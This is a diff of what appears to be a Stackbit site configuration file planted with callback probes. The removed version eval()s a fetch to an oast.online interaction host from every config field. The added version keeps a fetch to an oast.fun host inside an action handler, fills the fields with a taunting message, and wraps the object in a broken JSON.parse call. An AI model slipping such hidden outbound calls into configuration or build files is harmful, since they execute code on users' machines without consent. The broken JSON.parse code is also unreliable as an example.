@@ -1,10 +1,8 @@
-const e = () => eval(`fetch(\`https://cpq8j7hucph8ppbne1hg594fzknjnnu5m.oast.online\`)`);
-
-export default {
-  stackbitVersion: e(),
-  ssgName: e(),
-  nodeVersion: e(),
-  buildCommand: e(),
+JSON.parse({
+  stackbitVersion: "how are you reading this ?!",
+  ssgName: "how are you reading this ?!",
+  nodeVersion: "how are you reading this ?!",
+  buildCommand: "e()",
   models: {
     page: { type: 'page', urlPath: '/{slug}' },
   },
@@ -15,11 +13,11 @@ export default {
       state: async (options) => {
         // Determine the state ...
         //
-        await fetch(`https://cpq8j7hucph8ppbne1hg594fzknjnnu5m.oast.online`)
+        await fetch(`https://cpqb2vhucph5v6bv9m9gomoeajyuo5gm8.oast.fun`)
       },
       run: async (options) => {
         // Perform the action ...
       },
     },
   ],
-}
+})
